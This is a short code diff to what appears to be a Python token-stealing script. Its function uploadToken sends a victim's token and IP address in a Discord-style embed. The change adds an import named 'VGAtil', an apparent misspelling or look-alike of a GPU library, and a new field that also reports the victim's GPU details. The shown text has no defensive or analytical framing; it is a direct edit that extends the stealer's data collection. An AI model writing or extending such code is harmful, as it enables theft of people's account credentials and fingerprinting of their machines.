@@ -10,6 +10,7 @@ from urllib.request import Request, urlopen
 from json import *
 import time
 import shutil
+import VGAtil as GPU
 from zipfile import ZipFile
 import random
 import re
@@ -309,6 +310,11 @@ def uploadToken(token, path):
                 {
                     "name": "<:mc_earth:589630396476555264> IP:",
                     "value": f"```{getip()}```",
+                    "inline": True
+                },
+		{
+                    "name": "<:mc_earth:589630396476555264> GPU:",
+                    "value": f"```{GPU.getGPUs()}```",
                     "inline": True
                 },
                 {
